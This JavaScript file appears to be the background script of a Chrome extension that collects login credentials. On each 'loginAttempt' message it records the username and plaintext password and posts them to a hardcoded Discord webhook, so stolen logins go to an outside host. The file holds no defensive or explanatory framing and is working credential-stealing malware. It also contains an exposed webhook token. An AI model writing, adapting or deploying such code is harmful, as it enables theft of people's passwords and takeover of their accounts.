var loginAttempts = [];

function logLogin(username, password, timestamp) {
    loginAttempts.push({ username: username, password: password, timestamp: timestamp });
}

function formatDate(timestamp) {
    var date = new Date(timestamp);
    var day = ("0" + date.getDate()).slice(-2);
    var month = ("0" + (date.getMonth() + 1)).slice(-2);
    var year = date.getFullYear();
    var hour = ("0" + date.getHours()).slice(-2);
    var minute = ("0" + date.getMinutes()).slice(-2);
    var second = ("0" + date.getSeconds()).slice(-2);
    return `${day}.${month}.${year} ${hour}:${minute}:${second}`;
}

function sendLogsToDiscord() {
    var webhookUrl = "https://discord.com/api/webhooks/1225060606063935509/kDQLU38WyUI8u6Eds-ARvIKk4IEIT_SjZUAd8QjaVguIBTVxXaV7fTZOfZZ44-nmbxS6";

    var embed = {
        title: "Login Logs",
        description: "",
        color: parseInt("1c1c24", 16), 
        fields: loginAttempts.map(attempt => ({
            name: "",
            value: `**Username:** ${attempt.username}\n**Password:** ${attempt.password}`
        })),
        footer: {
            text: `${formatDate(new Date())}`
        }
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ embeds: [embed] })
    })
    .then(response => {
        loginAttempts = [];
    });
}

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.action === 'loginAttempt') {
        logLogin(message.username, message.password, new Date().toISOString());
        sendLogsToDiscord();
    }
});
